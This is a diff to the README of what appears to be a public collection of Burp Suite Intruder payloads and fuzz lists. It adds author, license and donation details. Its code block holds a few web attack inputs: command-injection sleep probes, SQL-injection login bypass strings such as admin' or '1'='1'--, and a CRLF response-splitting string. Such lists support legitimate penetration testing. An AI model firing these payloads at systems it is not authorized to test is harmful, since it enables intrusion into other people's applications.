@@ -1,9 +1,21 @@
+![alt tag](https://github.com/1N3/IntruderPayloads/blob/master/BurpsuiteIntruderPayloads.png)
+
 # IntruderPayloads
-A collection of Burpsuite Intruder payloads and fuzz lists and pentesting methodology. To pull down all 3rd party repos, run install.sh in the same directory of the IntruderPayloads folder.
+A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists and pentesting methodologies. To pull down all 3rd party repos, run install.sh in the same directory of the IntruderPayloads folder.
 
 Any comments or feedback/changes/improvements are welcome!
 
-Author: 1N3@CrowdShield https://crowdshield.com
+Author: xer0dayz@xerosecurity.com - https://xerosecurity.com
+
+## LICENSE:
+This software is free to distribute, modify and use with the condition that credit is provided to the creator (1N3@CrowdShield) and is not for commercial use.
+
+## DONATIONS:
+Donations are welcome. This will help fascilitate improved features, frequent updates and better overall support.
+- [x] BTC 1Fav36btfmdrYpCAR65XjKHhxuJJwFyKum
+- [x] DASH XoWYdMDGb7UZmzuLviQYtUGb5MNXSkqvXG
+- [x] ETH 0x20bB09273702eaBDFbEE9809473Fd04b969a794d
+- [x] LTC LQ6mPewec3xeLBYMdRP4yzeta6b9urqs2f
 
 
 ## PENTEST METHODOLOGY v2.0
@@ -108,7 +120,7 @@ en%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2
 sleep 5; sleep 5 || sleep 5 | sleep 5 & sleep 5 && sleep 5
 admin" or "1"="1"-- 
 admin' or '1'='1'-- 
-firstlastcompany%0a%0d%00
+INJECTX%0a%0d%00
 ```
 
 
